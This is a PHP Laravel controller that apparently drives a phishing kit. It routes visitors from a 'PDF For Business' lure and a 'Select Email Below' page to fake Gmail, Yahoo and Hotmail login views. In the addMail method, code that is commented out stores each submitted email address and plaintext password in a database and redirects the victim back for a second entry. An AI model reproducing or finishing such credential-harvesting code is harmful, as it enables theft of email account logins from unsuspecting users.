<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\URL;

use App\Post;

class PagesController extends Controller
{
  
  public function links(Request $req)
  {
    session(['action'=> "PagesController@addMail"]);
    $title = "Select Email Below";
    return view("pages.links")->with('title', $title); 
    #return "LInks File Page";
    

  }
public function gmail(Request $req)
{

   return view('pages.gmailLog');

}
public function ymail(Request $req)
{

   return view('pages.yahooLog');

}
public function hmail(Request $req)
{

   return view('pages.hotmail');

}
public function login(Request $req)
{
    $title = "Login Page";
    return view('pages.login')->with('title', $title);

}

public function getPDF(Request $req)
{   
    
    $title = "PDF For Business";
    return view('pages.getpdf')->with('title', $title);
    return view("getpdf");


}
public function confirm(Request $req)
{
   $mail = $req->input('mail');
   return("I have seen ".$mail);
 

}    //
public function try(Request $req)
{
    return("Form Loaded");

}
public function addMail(Request $req)
{
   return view("pages.getpdf");
   /*
  $this->validate($req, ['mail'=>'required', 'password'=>'required']);
 // if($req.POST) 
   $count = session('count', 0);
   $datas = new Post();
  if($count == 0) 
  // get previous pages via session;
  // Insert into post
  {
  
   $datas->email = $req->input('mail');
   $datas->password = $req->input('password');
   $datas->cpassword =  "Passwords";
   $datas->dates = "Today";

   $datas->save();
   session(['current'=>$datas->id, 'confirm'=>true]);
   $count = 1;
   session(['count'=>1]);
 
  $mail = $req->input('mail');
  //session(['mail'=>$mail, 'action'=>"PagesController@confirm"]);
  $previous = URL::previous();
  return redirect($previous);
  }
  else
  {
      //$this->confirm($req); 
      $datas = new Post();
      return('I have seen this before');
  }
 // else
  //{
  //  $length = sizeof(Post::all()); 
 //   $mail = $req->input('mail');
    //  Code toupdate  table for confirm mail;
 //   session(['count'=>0, 'mail'=>'']);   
 //   return view('pages.getpdf');

//  }
   */
}
}
